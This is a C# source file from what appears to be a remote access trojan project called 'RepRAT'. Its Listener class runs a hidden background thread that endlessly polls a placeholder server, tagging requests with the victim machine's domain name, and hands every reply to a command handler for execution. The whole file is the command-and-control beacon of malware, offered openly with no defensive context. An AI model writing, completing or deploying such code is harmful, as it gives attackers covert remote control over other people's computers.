using System.Diagnostics;
using System.Net;
using RepRAT.Commands;

namespace RepRAT.Listener;

public class Main
{
    static string pcUUID = Environment.UserDomainName;
    public static void Listen()
    {
        System.Threading.Thread scanThread = new System.Threading.Thread(() =>
        {
            while (true)
            {
                var url = "https://your_replit_server/connect?vuuid=" + pcUUID;

                var request = WebRequest.Create(url);
                request.Method = "GET";

                using var webResponse = request.GetResponse();
                using var webStream = webResponse.GetResponseStream();

                using var reader = new StreamReader(webStream);
                var data = reader.ReadToEnd();
                if (data != "Waiting...")
                {
                    Handler.exec_command(data);
                    Debug.WriteLine(data);
                }
                
                
            }
            System.Threading.Thread.CurrentThread.Abort();
        });
        scanThread.IsBackground = true;
        scanThread.Start();
    }
}